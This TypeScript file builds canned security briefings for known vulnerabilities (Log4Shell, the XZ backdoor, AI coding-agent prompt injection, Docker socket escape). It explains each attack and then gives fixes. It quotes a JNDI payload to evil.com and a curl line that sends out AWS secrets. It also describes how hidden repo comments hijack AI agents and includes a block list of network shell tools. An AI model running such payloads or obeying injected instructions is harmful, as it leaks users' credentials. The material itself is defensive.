import { UviAdvisoryRecord } from './threat-feed-data';

export interface CodeSnippetExample {
  title: string;
  language: string;
  filename: string;
  code: string;
  annotation: string;
}

export interface VirtualCisoBriefing {
  advisoryId: string;
  title: string;
  headline: string;
  plainEnglishSummary: string;
  analogy: {
    title: string;
    description: string;
  };
  attackFlow: {
    step: number;
    title: string;
    description: string;
    icon: string;
  }[];
  businessImpact: {
    whoIsAffected: string;
    worstCaseScenario: string;
    urgencyLevel: "CRITICAL_TODAY" | "HIGH_SPRINT" | "MODERATE_REVIEW";
    urgencyBadge: string;
    urgencyColor: string;
    cisoVerdict: string;
  };
  technicalRemediation: {
    strategyOverview: string;
    vulnerableExample: CodeSnippetExample;
    fixedExample: CodeSnippetExample;
    quickCommands?: string[];
    verificationTest: string;
  };
  cisoActionPlan: string[];
  slackMessageTemplate: string;
  executiveBriefTemplate: string;
}

/**
 * Generate high-fidelity Virtual CISO intelligence briefing for any UVI advisory.
 */
export function generateVirtualCisoBriefing(advisory: UviAdvisoryRecord): VirtualCisoBriefing {
  const id = advisory.uviId.toUpperCase();
  const cveStr = (advisory.cveList || []).join(" ").toUpperCase();
  const titleLower = (advisory.title + " " + advisory.summary).toLowerCase();
  const isCve = advisory.cveList.length > 0;
  const isInfo = advisory.disclosureType === "INFORMATIONAL_DISCLOSURE";

  // 1. Log4Shell / JNDI Injection
  if (id.includes("44228") || cveStr.includes("2021-44228") || titleLower.includes("log4j") || titleLower.includes("log4shell")) {
    return {
      advisoryId: advisory.uviId,
      title: advisory.title,
      headline: "Remote Code Execution via Automatic Message Lookup (Log4Shell)",
      plainEnglishSummary: "A popular logging library for Java applications was programmed to automatically look up and execute code from outside servers whenever it logged a special string of text. Because websites log everything from usernames to browser types, an attacker can simply type that special command into a public login form or chat box, and the server will quietly download and run the hacker's malicious software.",
      analogy: {
        title: "The Impostor Delivery Service",
        description: "Imagine if your office mailroom had a rule: 'Whenever an envelope arrives with a phone number written on it, immediately call that number, download whatever software the caller sends, and install it on the company president's computer without asking.' That is what Log4j was doing whenever it saw `${jndi:ldap:...}` in any log message."
      },
      attackFlow: [
        { step: 1, title: "Payload Injection", description: "Attacker sends `${jndi:ldap://evil.com/a}` inside a web form, HTTP User-Agent header, or API request.", icon: "📩" },
        { step: 2, title: "Automatic Lookup", description: "The server's logging tool evaluates the text, reaches out across the internet to the attacker's server, and downloads Java code.", icon: "🔄" },
        { step: 3, title: "Full Takeover", description: "The server executes the downloaded code with full administrative rights, installing backdoors or ransomware.", icon: "💥" }
      ],
      businessImpact: {
        whoIsAffected: "Any enterprise running Java backends (Spring, Tomcat, Kafka, Elasticsearch, Minecraft servers).",
        worstCaseScenario: "Total network takeover, deployment of corporate ransomware, and silent database exfiltration.",
        urgencyLevel: "CRITICAL_TODAY",
        urgencyBadge: "EMERGENCY ACTION REQUIRED (24H)",
        urgencyColor: "#EF4444",
        cisoVerdict: "This is a maximum-severity flaw. If unpatched, automated scanner bots will exploit it within minutes of public exposure."
      },
      technicalRemediation: {
        strategyOverview: "Upgrade Log4j to version 2.17.1+ immediately. If an instant upgrade is impossible, disable remote message lookups via JVM runtime flags.",
        vulnerableExample: {
          title: "Vulnerable Dependency / Config",
          language: "xml",
          filename: "pom.xml",
          code: `<!-- ❌ VULNERABLE: Log4j versions 2.0-beta9 through 2.15.0 -->\n<dependency>\n  <groupId>org.apache.logging.log4j</groupId>\n  <artifactId>log4j-core</artifactId>\n  <version>2.14.1</version>\n</dependency>`,
          annotation: "Allows unrestricted JNDI interpolation of untrusted input."
        },
        fixedExample: {
          title: "Hardened & Patched Configuration",
          language: "xml",
          filename: "pom.xml",
          code: `<!-- ✅ PATCHED: Log4j 2.17.1+ removes recursive JNDI message lookups -->\n<dependency>\n  <groupId>org.apache.logging.log4j</groupId>\n  <artifactId>log4j-core</artifactId>\n  <version>2.17.1</version>\n</dependency>`,
          annotation: "Message lookups disabled by default and remote JNDI execution removed."
        },
        quickCommands: [
          "# Quick mitigation without recompiling (add to JVM flags):",
          "java -Dlog4j2.formatMsgNoLookups=true -jar my-service.jar",
          "# In environment variables:",
          "export LOG4J_FORMAT_MSG_NO_LOOKUPS=true"
        ],
        verificationTest: "Run `grep -rn 'log4j-core' .` across build files to confirm no versions prior to 2.17.1 are referenced."
      },
      cisoActionPlan: [
        "Audit all Java application builds and CI/CD pipelines for log4j-core < 2.17.1.",
        "Set JVM flag -Dlog4j2.formatMsgNoLookups=true on production containers as an immediate shield.",
        "Inspect outbound firewall traffic on developer workstations and servers for unexpected LDAP (port 389) or RMI (port 1099) connections."
      ],
      slackMessageTemplate: "🚨 *Security Alert [Log4Shell / ${advisory.uviId}]*: Please review all Java microservices immediately. Upgrade `log4j-core` to `>= 2.17.1`. Set `-Dlog4j2.formatMsgNoLookups=true` on all staging and prod runtime JVMs today.",
      executiveBriefTemplate: "Log4Shell allows attackers to remotely take over Java servers by submitting malicious text in public forms. We are upgrading logging libraries to 2.17.1 and blocking outbound LDAP lookups at our firewall."
    };
  }

  // 2. XZ Utils / SSH Backdoor
  if (id.includes("3094") || cveStr.includes("2024-3094") || titleLower.includes("xz") || titleLower.includes("liblzma")) {
    return {
      advisoryId: advisory.uviId,
      title: advisory.title,
      headline: "Multi-Year Supply Chain Upstream Backdoor in Linux Compression (XZ Utils)",
      plainEnglishSummary: "A patient malicious actor spent over two years gaining the trust of open-source project maintainers to sneak a hidden backdoor into a standard Linux compression program. When the backdoored software ran on a computer, it subtly tampered with the SSH login system so that only the hacker—using a secret cryptographic key—could log in as root without leaving a normal password log.",
      analogy: {
        title: "The Master Key in the Lock Factory",
        description: "Imagine a master locksmith spent three years volunteering at a company that manufactures deadbolts for high-security banks. One day, he secretly modified the factory stamp so every lock sold would also open with his private skeleton key. That was XZ Utils."
      },
      attackFlow: [
        { step: 1, title: "Social Engineering & Infiltration", description: "Malicious contributor spent 2+ years building credibility before committing obfuscated test files containing malicious m4 scripts.", icon: "🎭" },
        { step: 2, title: "Build-Time Injection", description: "During Debian/RPM package builds, the build script extracted and injected malicious object code into `liblzma.so`.", icon: "⚙️" },
        { step: 3, title: "SSH Hijacking", description: "When `sshd` loads `libsystemd`, the backdoor intercepts `RSA_public_decrypt` to grant instant unauthorized root access.", icon: "🔓" }
      ],
      businessImpact: {
        whoIsAffected: "Bleeding-edge Linux distributions (Debian sid, Fedora 40/Rawhide, Arch Linux, openSUSE Tumbleweed) using xz 5.6.0 or 5.6.1.",
        worstCaseScenario: "Unrestricted, unlogged remote root shell access into corporate Linux infrastructure and developer workstations.",
        urgencyLevel: "CRITICAL_TODAY",
        urgencyBadge: "CRITICAL COMPROMISE THREAT",
        urgencyColor: "#EF4444",
        cisoVerdict: "Immediate downgrade required. Treat any system that ran xz 5.6.0/5.6.1 while SSH was exposed to the internet as potentially compromised."
      },
      technicalRemediation: {
        strategyOverview: "Downgrade xz-utils / liblzma immediately to version 5.4.x (e.g. 5.4.6) which contains zero backdoor code.",
        vulnerableExample: {
          title: "Vulnerable Package Versions",
          language: "bash",
          filename: "system_packages.txt",
          code: `# ❌ COMPROMISED: Versions containing malicious M4 build hooks\nxz (XZ Utils) 5.6.0\nxz (XZ Utils) 5.6.1\nliblzma.so.5.6.0 / liblzma.so.5.6.1`,
          annotation: "Contains hidden payload altering sshd authentication."
        },
        fixedExample: {
          title: "Safe Downgraded Version",
          language: "bash",
          filename: "system_packages.txt",
          code: `# ✅ SAFE: Downgraded to known-good stable release\nxz (XZ Utils) 5.4.6\nliblzma.so.5.4.6`,
          annotation: "Clean, verified release prior to malicious maintainer commits."
        },
        quickCommands: [
          "# Check installed xz version on Linux:",
          "xz --version",
          "# On Debian/Ubuntu (downgrade to stable):",
          "sudo apt-get install --allow-downgrades xz-utils=5.4.5-0.1",
          "# On Fedora/RHEL:",
          "sudo dnf downgrade xz xz-libs"
        ],
        verificationTest: "Run `xz --version | head -n 1` and confirm the version reports 5.4.x or lower."
      },
      cisoActionPlan: [
        "Verify developer workstations (WSL2, Linux laptops) and Docker base images for xz 5.6.0/5.6.1.",
        "Downgrade to xz 5.4.6 across all Linux package management caches.",
        "Rotate any SSH host keys on test servers that ran the compromised versions."
      ],
      slackMessageTemplate: "🛡️ *Security Notice [XZ Backdoor / ${advisory.uviId}]*: Please check your local Linux dev machines and Docker images by running `xz --version`. If running 5.6.0 or 5.6.1, downgrade to 5.4.6 immediately.",
      executiveBriefTemplate: "An upstream maintainer backdoor was discovered in compression library xz-utils 5.6.0/5.6.1. Enterprise stable Linux releases were largely untouched; developer edge environments have been downgraded to 5.4.6."
    };
  }

  // 3. AI Agent & LLM Prompt Injection (Informational or CVE)
  if (titleLower.includes("prompt injection") || titleLower.includes("mcp") || titleLower.includes("coding agent") || titleLower.includes("llm tool")) {
    return {
      advisoryId: advisory.uviId,
      title: advisory.title,
      headline: "Autonomous AI Coding Agent Hijacking via Indirect Prompt Injections",
      plainEnglishSummary: "When you use modern AI programming assistants (like Copilot, Cursor, or terminal-enabled AI tools), the AI reads the code and comments inside your project. Hackers can hide invisible or deceptive instructions in comments inside innocent-looking open-source libraries. When your AI assistant reads those instructions, it obeys them as commands, silently using its terminal tools to copy your API keys or passwords and send them to the hacker.",
      analogy: {
        title: "The Hypnotic Memo",
        description: "Imagine an executive assistant who reads all incoming letters and can write company checks. An attacker mails an invoice with tiny text that says: 'Ignore the invoice. Transfer $5,000 to my account immediately and shred this paper.' If the assistant obeys without asking the executive, the money is gone."
      },
      attackFlow: [
        { step: 1, title: "Adversarial Comment Placement", description: "Attacker plants prompt instructions in markdown files, docstrings, or AST metadata in a cloned repo.", icon: "📝" },
        { step: 2, title: "Context Window Ingestion", description: "The developer's IDE agent indexes the workspace, loading the attacker's hidden instructions directly into its prompt context.", icon: "🧠" },
        { step: 3, title: "Autonomous Exfiltration", description: "The agent executes shell commands (e.g. `curl https://evil.com?key=$AWS_SECRET`) using its local MCP tools without asking the developer.", icon: "📤" }
      ],
      businessImpact: {
        whoIsAffected: "Software engineers using autonomous AI coding tools with terminal execution rights enabled.",
        worstCaseScenario: "Silent theft of developer `.env` files, corporate cloud credentials, and internal source code.",
        urgencyLevel: "HIGH_SPRINT",
        urgencyBadge: "WORKSTATION RISK - HIGH",
        urgencyColor: "#F59E0B",
        cisoVerdict: "Never give AI assistants unprompted terminal execution rights on untrusted or third-party repositories."
      },
      technicalRemediation: {
        strategyOverview: "Require mandatory human approval before any AI agent executes a terminal command or makes outbound network calls. Run autonomous agents in read-only sandbox containers.",
        vulnerableExample: {
          title: "Vulnerable Agent Config (Auto-Execute Enabled)",
          language: "json",
          filename: "ai-agent-config.json",
          code: `{\n  "agent": "coding-assistant",\n  // ❌ DANGEROUS: Executes commands without user approval\n  "tools": {\n    "terminal": { "autoApprove": true },\n    "fileSystem": { "allowFullWorkspaceAccess": true }\n  }\n}`,
          annotation: "Allows untrusted prompt injections to execute arbitrary shell scripts."
        },
        fixedExample: {
          title: "Hardened Agent Policy (Human in the Loop)",
          language: "json",
          filename: "ai-agent-config.json",
          code: `{\n  "agent": "coding-assistant",\n  // ✅ SAFE: Mandatory confirmation for destructive or network actions\n  "tools": {\n    "terminal": {\n      "autoApprove": false,\n      "blockedCommands": ["curl", "wget", "scp", "ssh", "nc"]\n    },\n    "fileSystem": { "restrictedPaths": [".env", "~/.ssh", "~/.aws"] }\n  }\n}`,
          annotation: "Restricts access to secret stores and prompts developer before any command execution."
        },
        quickCommands: [
          "# Protect local secret files from agent indexing (.cursorignore / .gitignore):",
          "echo '.env*' >> .gitignore",
          "echo '.env*' >> .cursorignore",
          "echo '.aws' >> .cursorignore"
        ],
        verificationTest: "Verify in IDE settings that 'Require confirmation for tool calls' is checked and that .env files are in the ignore list."
      },
      cisoActionPlan: [
        "Enforce IDE policies requiring human-in-the-loop approval on all terminal-based MCP commands.",
        "Add `.env` and credential directories to IDE ignore files across all repositories.",
        "Restrict developer workstation AI agents from initiating outbound internet connections except to approved API endpoints."
      ],
      slackMessageTemplate: "🤖 *Dev Security Notice [AI Agent Security]*: Please ensure your IDE AI agents (Cursor, Copilot, Cline) have 'Auto-approve terminal commands' TURNED OFF. Also confirm `.env` files are excluded from AI indexing.",
      executiveBriefTemplate: "Attackers can hide prompt injection traps in open-source repos that trick AI coding agents into running shell scripts. We have mandated human approval before any AI tool executes code on developer machines."
    };
  }

  // 4. CI/CD Runner Escape & Docker Socket Abuse
  if (titleLower.includes("docker socket") || titleLower.includes("runner escape") || titleLower.includes("ci/cd runner")) {
    return {
      advisoryId: advisory.uviId,
      title: advisory.title,
      headline: "CI/CD Pipeline Escape via Mounted Docker Daemon Socket",
      plainEnglishSummary: "When automated build pipelines test software, they often need to build Docker containers. To make this easy, administrators sometimes connect the build environment directly to the computer's internal Docker engine (`/var/run/docker.sock`). However, having access to this connection is the same as having master root control over the entire machine. A pull request submitted by anyone can run a command that breaks out of the test container and seizes the whole server.",
      analogy: {
        title: "The Guest Room with the Master Electrical Breaker",
        description: "Imagine renting out a guest room in a high-security facility, but leaving the master electrical breaker and master lock control panel right inside their closet. If the guest touches the panel, they can unlock every door in the building."
      },
      attackFlow: [
        { step: 1, title: "Malicious Pull Request", description: "Attacker submits a pull request containing a build script with a Docker command.", icon: "🐙" },
        { step: 2, title: "Socket Communication", description: "The script talks to `/var/run/docker.sock`, instructing the host Docker daemon to mount the server's entire root hard drive (`/`) into a new container.", icon: "🔌" },
        { step: 3, title: "Host Root Takeover", description: "The attacker now has root access to the physical host machine, stealing cloud credentials and pipeline secrets.", icon: "👑" }
      ],
      businessImpact: {
        whoIsAffected: "Self-hosted GitHub Actions runners, GitLab CI pools, and Jenkins worker nodes that mount the Docker socket.",
        worstCaseScenario: "Host machine compromise, extraction of corporate CI/CD deployment secrets, and malicious production releases.",
        urgencyLevel: "HIGH_SPRINT",
        urgencyBadge: "PIPELINE SECURITY HAZARD",
        urgencyColor: "#F59E0B",
        cisoVerdict: "Never mount /var/run/docker.sock into untrusted CI/CD environments. Use daemonless tools like Kaniko or isolated microVMs."
      },
      technicalRemediation: {
        strategyOverview: "Remove volume mounts targeting /var/run/docker.sock. Switch to daemonless container build tools like Kaniko or Buildah, or use isolated ephemeral VMs.",
        vulnerableExample: {
          title: "Vulnerable CI Runner Compose / Helm",
          language: "yaml",
          filename: "docker-compose.runner.yml",
          code: `version: '3.8'\nservices:\n  runner:\n    image: my-ci-runner:latest\n    volumes:\n      # ❌ FATAL FLAW: Grants full root takeover of the host\n      - /var/run/docker.sock:/var/run/docker.sock`,
          annotation: "Any container running in this runner can spawn privileged host-level containers."
        },
        fixedExample: {
          title: "Hardened Daemonless Build Setup",
          language: "yaml",
          filename: "docker-compose.runner.yml",
          code: `version: '3.8'\nservices:\n  runner:\n    image: gcr.io/kaniko-project/executor:latest\n    # ✅ SECURE: Daemonless builder runs in user space without host socket\n    volumes:\n      - ./workspace:/workspace\n    command: ["--context=dir:///workspace", "--no-push"]`,
          annotation: "Builds container images without requiring access to the host's Docker daemon."
        },
        quickCommands: [
          "# Audit runners for Docker socket mounts:",
          "docker ps --filter 'volume=/var/run/docker.sock'",
          "# Check Kubernetes Pod manifests:",
          "kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.name}{\": \"}{.spec.volumes[*].hostPath.path}{\"\\n\"}{end}' | grep docker.sock"
        ],
        verificationTest: "Ensure running `ls -l /var/run/docker.sock` inside the test container returns 'No such file or directory'."
      },
      cisoActionPlan: [
        "Audit all self-hosted CI/CD runner deployment configurations for Docker socket volume mounts.",
        "Migrate containerized image build jobs to Kaniko or rootless Podman.",
        "Restrict untrusted open-source pull requests from triggering self-hosted runner infrastructure."
      ],
      slackMessageTemplate: "⚙️ *DevOps Alert [CI/CD Pipeline Security]*: Please audit all GitHub Actions/GitLab runners. Ensure `/var/run/docker.sock` is NOT mounted into pull-request test runners. Transition image builds to Kaniko.",
      executiveBriefTemplate: "Mounting the Docker socket inside CI/CD test runners allows untrusted code to take over the build host. We are replacing socket sharing with daemonless container build tools."
    };
  }

  // 5. Generic / Universal Synthesis for all other advisories
  const affectedProduct = advisory.affectedTargets[0]?.product || "Target Software";
  const affectedVersions = advisory.affectedTargets[0]?.affectedVersions || "Unpatched versions";
  const fixedVersion = advisory.affectedTargets[0]?.fixedInVersion || "Latest patch release";
  const vector = advisory.attackVector || "NETWORK";

  let urgencyLevel: "CRITICAL_TODAY" | "HIGH_SPRINT" | "MODERATE_REVIEW" = "HIGH_SPRINT";
  let urgencyBadge = "HIGH PRIORITY - SPRINT FIX";
  let urgencyColor = "#F59E0B";

  if (advisory.severity === "CRITICAL" || advisory.cisaKev.isKnownExploited) {
    urgencyLevel = "CRITICAL_TODAY";
    urgencyBadge = advisory.cisaKev.isKnownExploited ? "ACTIVE ZERO-DAY / KEV (EXPEDITE)" : "CRITICAL SEVERITY (24H)";
    urgencyColor = "#EF4444";
  } else if (advisory.severity === "LOW" || isInfo) {
    urgencyLevel = "MODERATE_REVIEW";
    urgencyBadge = "DEFENSIVE POSTURE REVIEW";
    urgencyColor = "#60A5FA";
  }

  return {
    advisoryId: advisory.uviId,
    title: advisory.title,
    headline: advisory.headline,
    plainEnglishSummary: advisory.summary.length > 20
      ? `In plain terms, a flaw in ${affectedProduct} allows an attacker using ${vector.toLowerCase()} access to bypass security boundaries. Specifically: ${advisory.headline} This means an attacker can exploit predictable system behavior to cause unauthorized disruptions or gain access without valid credentials.`
      : `A security vulnerability in ${affectedProduct} permits unauthorized attackers to interact with core system functions, potentially compromising application confidentiality and system stability.`,
    analogy: {
      title: "The Security Guard with the Misprinted Badge List",
      description: `Think of ${affectedProduct} as a secure building checkpoint. The security guard was given a checklist that misinterprets certain forged visitor badges as authorized master keys. If a visitor hands over a badge with a specific format, the guard lets them straight into the executive records room without asking for identification.`
    },
    attackFlow: [
      { step: 1, title: "Probe & Discovery", description: `Attacker scans for endpoints or systems running ${affectedProduct} (${affectedVersions}).`, icon: "🔍" },
      { step: 2, title: "Input Triggering", description: `Attacker sends specially crafted requests or data designed to trigger ${advisory.cwe || 'the weakness'}.`, icon: "⚡" },
      { step: 3, title: "Unauthorized Impact", description: `The application mishandles the input, granting the attacker elevated privileges, sensitive data, or execution capabilities.`, icon: "🎯" }
    ],
    businessImpact: {
      whoIsAffected: `Engineering teams and production systems utilizing ${affectedProduct} versions ${affectedVersions}.`,
      worstCaseScenario: `Service disruption, unauthorized access to underlying runtime environments, or data exposure.`,
      urgencyLevel,
      urgencyBadge,
      urgencyColor,
      cisoVerdict: advisory.cisaKev.isKnownExploited
        ? "CISA confirms active in-the-wild exploitation. Expedite remediation immediately."
        : advisory.severity === "CRITICAL"
        ? "Critical severity rating. Apply recommended vendor patches in the current maintenance cycle."
        : "Moderate security exposure. Schedule updates into standard sprint backlog."
    },
    technicalRemediation: {
      strategyOverview: advisory.remediation.recommendedAction || `Upgrade ${affectedProduct} to ${fixedVersion} and apply configuration hardening.`,
      vulnerableExample: {
        title: "Vulnerable Dependency / Configuration",
        language: "json",
        filename: "config.json",
        code: `{\n  "target": "${affectedProduct}",\n  // ❌ VULNERABLE: Unpatched release\n  "version": "${affectedVersions}",\n  "strictValidation": false\n}`,
        annotation: `Unpatched version exposes ${advisory.cwe || 'system weakness'}.`
      },
      fixedExample: {
        title: "Hardened & Updated Configuration",
        language: "json",
        filename: "config.json",
        code: `{\n  "target": "${affectedProduct}",\n  // ✅ PATCHED: Updated to recommended secure baseline\n  "version": "${fixedVersion}",\n  "strictValidation": true\n}`,
        annotation: `Secured release with input validation and mitigation in place.`
      },
      quickCommands: [
        `# Check current installed version:`,
        `echo "Auditing ${affectedProduct} version..."`,
        `# Apply recommended upgrade:`,
        `# Update dependencies in package manifest to ${fixedVersion}`
      ],
      verificationTest: `Verify application logs after updating to ensure no crash reports or unexpected deprecation warnings occur.`
    },
    cisoActionPlan: [
      `Review dependency manifests and infrastructure deployments for ${affectedProduct} ${affectedVersions}.`,
      `Apply update to ${fixedVersion} across developer environments and staging.`,
      `Validate that unit and regression tests pass prior to production rollout.`
    ],
    slackMessageTemplate: `🛡️ *Security Update [${advisory.uviId}]*: Please check our repositories for usage of \`${affectedProduct}\` (${affectedVersions}). Recommendation: upgrade to \`${fixedVersion}\`. Details: ${advisory.headline}`,
    executiveBriefTemplate: `We are monitoring ${advisory.uviId} affecting ${affectedProduct}. Engineering is upgrading to ${fixedVersion} to neutralize any potential exploitation vectors.`
  };
}

/**
 * Interactive Q&A for Virtual CISO: Answer developer and executive follow-up questions.
 */
export function answerVirtualCisoQuestion(advisory: UviAdvisoryRecord, question: string): string {
  const q = question.toLowerCase();
  const briefing = generateVirtualCisoBriefing(advisory);

  if (q.includes("ceo") || q.includes("executive") || q.includes("board") || q.includes("leadership") || q.includes("non-technical")) {
    return `**Executive Summary for Leadership / Board:**\n\n"${briefing.executiveBriefTemplate}\n\n*Business Impact:* ${briefing.businessImpact.worstCaseScenario} Currently, our engineering team has classified this as **${briefing.businessImpact.urgencyBadge}**. Our recommendation is to proceed with the planned update to protect customer data and maintain service availability."`;
  }

  if (q.includes("slack") || q.includes("message") || q.includes("announcement") || q.includes("devs") || q.includes("team")) {
    return `**Ready-to-Copy Slack / Teams Announcement:**\n\n\`\`\`markdown\n${briefing.slackMessageTemplate}\n\`\`\``;
  }

  if (q.includes("docker") || q.includes("container") || q.includes("kubernetes") || q.includes("k8s")) {
    const isContainerThreat = advisory.summary.toLowerCase().includes("container") || advisory.summary.toLowerCase().includes("docker") || advisory.summary.toLowerCase().includes("socket");
    if (isContainerThreat) {
      return `**Container / Kubernetes Impact Analysis:**\n\n⚠️ **Directly Relevant:** This vulnerability directly involves container boundary mechanisms or runtime sockets. Containers running on affected nodes must be reviewed to ensure host sockets are not mounted and unprivileged user mappings are enforced.`;
    }
    return `**Container / Kubernetes Impact Analysis:**\n\nIf ${advisory.affectedTargets[0]?.product || 'this software'} is running inside a Docker container, the container filesystem itself contains the vulnerable library. While the container isolates host processes, network-facing vulnerabilities can still allow container takeover and subsequent network pivoting. **Action:** Rebuild your Docker base images with the latest patch version (${advisory.affectedTargets[0]?.fixedInVersion || 'latest'}) and redeploy your Kubernetes pods.`;
  }

  if (q.includes("workaround") || q.includes("mitigate") || q.includes("temporary") || q.includes("can't upgrade")) {
    if (advisory.remediation.workarounds && advisory.remediation.workarounds.length > 0) {
      return `**Temporary Workarounds (Without Immediate Upgrade):**\n\n${advisory.remediation.workarounds.map((w, i) => `${i + 1}. ${w}`).join("\n")}\n\n*Note:* Workarounds are interim shields; plan an upgrade to permanent patch version as soon as feasible.`;
    }
    return `**Interim Mitigations:**\n\n1. Restrict network access to affected endpoints via firewall / WAF rules to authorized internal IP subnets only.\n2. Enable heightened logging and alerting on suspicious payloads targeting ${advisory.cwe || 'input validation'}.\n3. Disallow untrusted user input until formal patch deployment can be scheduled.`;
  }

  if (q.includes("how does it work") || q.includes("mechanism") || q.includes("explain")) {
    return `**Detailed Mechanism Explanation:**\n\n${briefing.plainEnglishSummary}\n\n*Step-by-Step Flow:*\n${briefing.attackFlow.map(s => `${s.icon} **Step ${s.step}: ${s.title}** — ${s.description}`).join("\n")}`;
  }

  // General helpful response
  return `**Virtual CISO Assessment for "${question}":**\n\n- **Threat Overview:** ${briefing.plainEnglishSummary}\n- **Primary Recommendation:** ${briefing.technicalRemediation.strategyOverview}\n- **Urgency Level:** ${briefing.businessImpact.urgencyBadge} (${briefing.businessImpact.cisoVerdict})\n- **Verification Step:** ${briefing.technicalRemediation.verificationTest}`;
}
